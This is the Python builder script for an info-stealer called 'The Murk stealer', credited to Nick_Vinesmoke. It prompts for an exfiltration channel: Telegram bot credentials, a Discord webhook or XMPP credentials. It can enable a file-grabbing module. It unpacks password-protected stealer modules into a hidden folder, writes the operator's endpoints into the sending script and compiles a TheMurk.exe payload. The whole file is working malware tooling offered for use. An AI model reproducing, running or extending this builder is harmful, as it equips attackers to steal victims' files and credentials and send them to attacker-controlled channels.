#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#




import shutil
import os 
import win32con
import win32api
import pyzipper 
import time




class Builder():
    def __init__(self) -> None:
        self.type = self.Menu()
        if self.type == "Telegram" :
            self.Telegram()
        if self.type == "Discord" :
            self.Discord()
        if self.type == "XMPP" :
            self.XMPP()

    def Menu(self):
        cmd = 'mode 80,30'
        os.system(cmd)
        self.logo = '''#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#'''
        print("\033[34m{}\033[0m".format(self.logo))
        print("\033[33m{}\033[0m".format("(i) Welcome to the Murk builder\n\n"))
        self.type = ""
        while self.type != "Telegram" and self.type != "Discord" and self.type != "XMPP":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Telegram/Discord/XMPP)"))
            self.type = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\n\n")
        return self.type

    def Telegram(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) HTTP API"))
        self.HTTP = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Telegram ID"))
        self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.FG = ""
        while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")
        

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            time.sleep(30)
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.BuildTelegram(self.HTTP,self.ID,self.FG)
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.BuildTelegram(self.HTTP,self.ID,self.FG)
            self.libs = "n"



    def Discord(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) WebHook URL"))
        self.urlWebHook = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Bot name"))
        self.name = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.FG = ""
        while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")
        

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            time.sleep(30)
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.BuildDiscord(self.urlWebHook,self.name,self.FG)
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.BuildDiscord(self.urlWebHook,self.name,self.FG)
            self.libs = "n"

    def XMPP(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberid"))
        self.jabberid = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberpassword"))
        self.jabberpassword = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberreceiver"))
        self.jabberreceiver = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.FG = ""
        while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")
        

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            time.sleep(30)
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.BuildXMPP(self.jabberid,self.jabberpassword,self.jabberreceiver,self.FG)
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.BuildXMPP(self.jabberid,self.jabberpassword,self.jabberreceiver,self.FG)
            self.libs = "n"



    def BuildXMPP(self, jabberid,jabberpassword,jabberreceiver,FG):
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py', 'r') as f:
            old_data = f.read()

        new_data = old_data.replace('jabberid = \"\"', f'jabberid = \'{jabberid}\'')
        new_data = new_data.replace('jabberpassword = \"\"', f'jabberpassword = \'{jabberpassword}\'')
        new_data = new_data.replace('jabberreceiver = \"\"', f'jabberreceiver = \'{jabberreceiver}\'')
        if FG == "Y" or FG == "y":
            with open ("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py", "r") as fg:
                fg_data = fg.read()
            fg_data = fg_data.replace('enableFileGrubber = False', 'enableFileGrubber = True')

            with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as fg:
                fg.write(fg_data)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py', 'w') as f:
            f.write(new_data)

        os.rename("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py","buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/send.py")
        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py")
        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py")


        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        os.system('start Compile.bat')
        while os.path.exists("TheMurk.exe") == 0:
            pass
        if os.path.exists("TheMurk.exe") == 1:
                    time.sleep(180)
                    os.chdir(f'{fullPath}')
                    shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)

        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))


    def BuildDiscord(self,urlWebHook,name,FG):
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py', 'r') as f:
            old_data = f.read()

        new_data = old_data.replace('urlWebHook = \"\"', f'urlWebHook = \'{urlWebHook}\'')
        new_data = new_data.replace('botName = \"\"', f'botName = \'{name}\'')
        if FG == "Y" or FG == "y":
            with open ("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py", "r") as fg:
                fg_data = fg.read()
            fg_data = fg_data.replace('enableFileGrubber = False', 'enableFileGrubber = True')

            with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as fg:
                fg.write(fg_data)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py', 'w') as f:
            f.write(new_data)
        
        os.rename("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py","buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/send.py")
        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py")
        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py")

        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        os.system('start Compile.bat')
        while os.path.exists("TheMurk.exe") == 0:
            pass
        if os.path.exists("TheMurk.exe") == 1:
                    time.sleep(180)
                    os.chdir(f'{fullPath}')
                    shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)

        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))


    def BuildTelegram(self,token,id,FG):
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py', 'r') as f:
            old_data = f.read()

        new_data = old_data.replace('Token = \"\"', f'Token = \'{token}\'')
        new_data = new_data.replace('ID = \"\"', f'ID = \'{id}\'')
        if FG == "Y" or FG == "y":
            with open ("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py", "r") as fg:
                fg_data = fg.read()
            fg_data = fg_data.replace('enableFileGrubber = False', 'enableFileGrubber = True')

            with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as fg:
                fg.write(fg_data)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py', 'w') as f:
            f.write(new_data)

        os.rename("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendT.py","buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/send.py")
        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendD.py")
        os.remove("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/scripts/send/sendX.py")


        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        os.system('start Compile.bat')
        while os.path.exists("TheMurk.exe") == 0:
            pass
        if os.path.exists("TheMurk.exe") == 1:
                    time.sleep(180)
                    os.chdir(f'{fullPath}')
                    shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)

        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))


Builder()
